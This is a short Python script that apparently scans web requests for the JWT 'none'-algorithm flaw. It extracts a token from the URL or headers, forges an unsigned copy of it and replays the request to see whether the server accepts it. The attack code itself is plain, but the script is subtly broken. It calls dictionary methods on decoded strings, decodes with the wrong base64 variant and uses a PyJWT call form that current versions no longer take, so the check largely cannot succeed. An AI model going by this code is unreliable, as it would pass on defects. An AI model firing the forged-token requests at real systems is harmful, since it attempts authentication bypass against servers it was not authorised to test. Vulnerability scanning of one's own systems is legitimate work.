"""
Author: Ayush Bhandari
Email: ayushbhandariofficial@gmail.com
"""
import jwt
import base64
import urllib.parse
from requests import Request, Session


# Function to decode JWT
def decode_jwt(jwt_token):
    jwt_decode_list = []
    try:
        jwt_list = jwt_token.split('.')
        for token in jwt_list:
            missing_padding = len(token) % 4
            if missing_padding != 0:
                token += '=' * (4 - missing_padding)
            jwt_decode_list.append(base64.b64decode(token).decode('utf-8'))
    except Exception as e:
        return {"error": str(e)}
    return jwt_decode_list


# Function to check for JWT none algorithm vulnerability
def jwt_none(url, method, headers, body, jwt_loc, jwt_key, jwt_token, jwt_data):
    encoded_jwt = jwt.encode(jwt_data, '', algorithm='none')

    if jwt_loc == "url":
        url = url.replace(jwt_token, encoded_jwt)
    elif jwt_loc == "header":
        headers[jwt_key] = encoded_jwt

    session = Session()
    req = Request(method, url, headers=headers, data=body)
    prepared_req = session.prepare_request(req)
    response = session.send(prepared_req)

    if response.status_code < 400:
        return {
            "url": url,
            "alert": "JWT none Algorithm vulnerability",
            "severity": "High",
            "req_headers": headers,
            "req_body": body,
            "res_headers": dict(response.headers),
            "res_body": response.text
        }

    return None


# Function to identify JWT token from URL or headers
def find_jwt(url, headers):
    url_query = urllib.parse.urlparse(url)
    parsed_query = urllib.parse.parse_qs(url_query.query)

    for key, value in parsed_query.items():
        try:
            jwt.decode(value[0], verify=False)
            return "url", key, value[0]
        except jwt.InvalidTokenError:
            pass

    for key, value in headers.items():
        try:
            jwt.decode(value, verify=False)
            return "header", key, value
        except jwt.InvalidTokenError:
            pass

    return None, None, None


# Function to perform the JWT check
def jwt_check(url, method, headers, body):
    jwt_loc, jwt_key, jwt_token = find_jwt(url, headers)
    if jwt_loc is None:
        return {"result": "No JWT token found in URL or headers"}

    jwt_decoded_list = decode_jwt(jwt_token)
    if jwt_decoded_list:
        try:
            alg = jwt_decoded_list[0].get('alg', 'none')
            jwt_data = jwt_decoded_list[1]

            if alg in ['HS256', 'HS384', 'HS512']:
                result = jwt_none(url, method, headers, body, jwt_loc, jwt_key, jwt_token, jwt_data)
                if result:
                    return result

        except Exception as e:
            return {"error": str(e)}

    return {"result": "No vulnerabilities found"}

# Example Usage result = jwt_check("http://example.com?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
# .eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
# .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c", "GET", {}, {}) print(result)
